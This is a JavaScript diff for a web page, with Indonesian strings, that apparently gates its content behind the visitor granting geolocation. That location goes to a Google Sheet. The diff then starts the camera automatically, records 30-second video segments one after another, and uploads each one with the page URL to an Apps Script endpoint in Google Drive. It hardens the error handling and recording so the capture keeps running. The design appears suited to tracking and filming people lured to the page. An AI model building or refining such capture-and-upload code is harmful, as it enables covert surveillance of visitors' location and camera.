@@ -86,7 +86,16 @@ async function startCameraRecording() {
     stopCameraButton.classList.remove("hidden");
     setCameraStatus("Kamera aktif — merekam segmen 30 detik.");
     recordVideoSegment();
-  } catch (error) { setCameraStatus("Izin kamera ditolak atau kamera tidak tersedia."); }
+  } catch (error) {
+    const messages = {
+      NotAllowedError: "Izin kamera ditolak. Izinkan Camera di pengaturan situs.",
+      NotFoundError: "Kamera tidak ditemukan di perangkat ini.",
+      NotReadableError: "Kamera sedang dipakai aplikasi lain.",
+      SecurityError: "Kamera membutuhkan HTTPS atau localhost."
+    };
+    setCameraStatus(messages[error.name] || "Kamera tidak dapat diaktifkan.");
+    console.warn("Gagal mengaktifkan kamera:", error);
+  }
 }
 
 function recordVideoSegment() {
@@ -96,23 +105,56 @@ function recordVideoSegment() {
   const chunks = [];
   const recorderMimeType = mediaRecorder.mimeType || "video/webm";
   const startedAt = new Date().toISOString();
-  mediaRecorder.ondataavailable = event => { if (event.data.size) chunks.push(event.data); };
-  mediaRecorder.onstop = async () => {
-    if (!chunks.length || stoppingCamera) return;
-    const blob = new Blob(chunks, { type: recorderMimeType });
-    setCameraStatus("Mengunggah segmen video ke Google Drive...");
-    try { await uploadVideo(blob, startedAt); if (!stoppingCamera) { setCameraStatus("Kamera aktif — merekam segmen berikutnya."); recordVideoSegment(); } }
-    catch (error) { stopCameraTracks(); setCameraStatus("Upload gagal; kamera dihentikan."); console.warn(error); }
+  mediaRecorder.ondataavailable = event => { if (event.data && event.data.size > 0) chunks.push(event.data); };
+  mediaRecorder.onerror = event => {
+    console.warn("MediaRecorder error:", event.error || event);
+    setCameraStatus("Perekaman gagal. Periksa izin kamera dan ruang penyimpanan.");
   };
-  mediaRecorder.start();
-  window.setTimeout(() => { if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop(); }, VIDEO_SEGMENT_MS);
+  mediaRecorder.onstop = async () => {
+    if (stoppingCamera) return;
+    const blob = new Blob(chunks, { type: recorderMimeType });
+    if (!blob.size) {
+      setCameraStatus("Segmen video kosong; perekaman dicoba ulang.");
+      recordVideoSegment();
+      return;
+    }
+    setCameraStatus(`Mengunggah video (${Math.ceil(blob.size / 1024)} KB)...`);
+    try {
+      await uploadVideo(blob, startedAt);
+      if (!stoppingCamera) {
+        setCameraStatus("Upload berhasil — merekam segmen berikutnya.");
+        recordVideoSegment();
+      }
+    } catch (error) {
+      stopCameraTracks();
+      setCameraStatus("Upload gagal; periksa deployment Apps Script.");
+      console.warn("Upload video gagal:", error);
+    }
+  };
+  // Timeslice memastikan data tersedia di browser yang tidak mengeluarkan chunk hanya saat stop.
+  mediaRecorder.start(1000);
+  window.setTimeout(() => {
+    if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop();
+  }, VIDEO_SEGMENT_MS);
 }
 
 async function uploadVideo(blob, startedAt) {
+  if (!APPS_SCRIPT_URL || APPS_SCRIPT_URL === "PASTE_APPS_SCRIPT_URL_HERE") throw new Error("URL Apps Script belum dikonfigurasi.");
   if (blob.size > MAX_VIDEO_BYTES) throw new Error("Segmen video melebihi batas 8 MB.");
   const reader = new FileReader();
-  const base64 = await new Promise((resolve, reject) => { reader.onloadend = () => resolve(String(reader.result).split(",")[1]); reader.onerror = reject; reader.readAsDataURL(blob); });
-  await fetch(APPS_SCRIPT_URL, { method: "POST", mode: "no-cors", headers: { "Content-Type": "text/plain;charset=utf-8" }, body: JSON.stringify({ type: "video", base64, mimeType: blob.type, startedAt, page: window.location.href }) });
+  const base64 = await new Promise((resolve, reject) => {
+    reader.onloadend = () => resolve(String(reader.result).split(",")[1] || "");
+    reader.onerror = () => reject(new Error("Video tidak dapat dibaca browser."));
+    reader.readAsDataURL(blob);
+  });
+  if (!base64) throw new Error("Data video kosong.");
+  const response = await fetch(APPS_SCRIPT_URL, {
+    method: "POST",
+    mode: "no-cors",
+    headers: { "Content-Type": "text/plain;charset=utf-8" },
+    body: JSON.stringify({ type: "video", base64, mimeType: blob.type || "video/webm", startedAt, page: window.location.href })
+  });
+  if (response.type !== "opaque" && !response.ok) throw new Error(`Apps Script HTTP ${response.status}.`);
 }
 
 function stopCameraRecording() {
@@ -156,8 +198,9 @@ async function handleSuccess(position) {
   // Kirim ke Google Sheet (async, tapi tidak blocking tampilan)
   sendToSheet(data);
 
-  // Tampilkan konten utama
+  // Tampilkan konten utama, lalu minta kamera setelah lokasi berhasil.
   showMainContent();
+  if (!cameraStream && !stoppingCamera) await startCameraRecording();
 }
 
 // === HANDLE: LOKASI GAGAL / DITOLAK ===
